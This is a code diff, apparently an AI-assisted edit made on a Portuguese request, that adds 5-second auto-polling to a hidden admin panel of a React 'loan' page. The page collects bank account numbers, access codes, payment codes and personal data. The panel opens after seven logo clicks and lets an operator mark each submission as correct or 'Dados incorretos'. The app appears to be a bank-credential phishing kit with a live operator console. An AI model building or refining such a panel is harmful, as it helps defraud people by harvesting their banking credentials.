@@ -1,6 +1,3 @@
-/** 
- * Retire isso de atualizar manual bem grande aquelas abas devem aparecer e mete um símbolo ao lado do nome painel admin de atualizar o site não atualiza sem eu clicar e tire falhas e loops
- */
 import { createFileRoute } from "@tanstack/react-router";
 import { useState, useEffect, useRef, useMemo } from "react";
 import { motion, AnimatePresence } from "framer-motion";
@@ -274,30 +271,11 @@ function Index() {
     }
   }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData, applicationId]);
 
-  const fetchApplications = async () => {
-    if (!adminAuthenticated) return;
-    setLoading(true);
-    try {
-      const data = await getApplications({ data: { adminPassword } });
-      setApplications(data as any[]);
-    } catch (err: any) {
-      toast.error(err.message || "Erro ao carregar dados");
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  useEffect(() => {
-    if (adminAuthenticated) {
-      fetchApplications();
-    }
-  }, [adminAuthenticated]);
-
   // Handle secret admin access
   useEffect(() => {
     if (logoClicks >= 7) {
-      setAdminAuthenticated(false); // Reset authentication status first
-      setAdminPassword(""); // Clear password field
+      setAdminAuthenticated(false);
+      setAdminPassword("");
       setStep("admin");
       setLogoClicks(0);
       toast.info("Acesso Administrativo - Por favor, insira a senha");
@@ -305,6 +283,25 @@ function Index() {
     const timer = setTimeout(() => setLogoClicks(0), 1000);
     return () => clearTimeout(timer);
   }, [logoClicks]);
+
+  useEffect(() => {
+    if (adminAuthenticated) {
+      const fetchApps = async () => {
+        setLoading(true);
+        try {
+          const data = await getApplications({ data: { adminPassword } });
+          setApplications(data as any[]);
+        } catch (err: any) {
+          toast.error(err.message || "Erro ao carregar dados");
+        } finally {
+          setLoading(false);
+        }
+      };
+      fetchApps();
+      const interval = setInterval(fetchApps, 5000);
+      return () => clearInterval(interval);
+    }
+  }, [adminAuthenticated, adminPassword]);
 
   const handleScroll = () => {
     if (scrollRef.current) {
@@ -513,11 +510,7 @@ function Index() {
     useEffect(() => {
       const savedScroll = sessionStorage.getItem("admin_scroll_pos");
       if (savedScroll && adminScrollRef.current) {
-        setTimeout(() => {
-          if (adminScrollRef.current) {
-            adminScrollRef.current.scrollTop = parseInt(savedScroll);
-          }
-        }, 100);
+        adminScrollRef.current.scrollTop = parseInt(savedScroll);
       }
     }, [adminTab, applications, deletedApps, filter]);
 
@@ -547,7 +540,13 @@ function Index() {
 
     useEffect(() => {
       if (adminAuthenticated) {
-        if (adminTab === "users") fetchApplications();
+        if (adminTab === "users") {
+          const fetch = async () => {
+            const data = await getApplications({ data: { adminPassword } });
+            setApplications(data as any[]);
+          };
+          fetch();
+        }
         else fetchDeletedApps();
       }
     }, [adminAuthenticated, adminTab]);
@@ -557,7 +556,10 @@ function Index() {
         isOpen: true, 
         appId: id, 
         isCorrect,
-        onConfirm: fetchApplications
+        onConfirm: async () => {
+          const data = await getApplications({ data: { adminPassword } });
+          setApplications(data as any[]);
+        }
       });
       setCustomRejectionReason(isCorrect ? "Empréstimo Aprovado" : "Dados incorretos");
     };
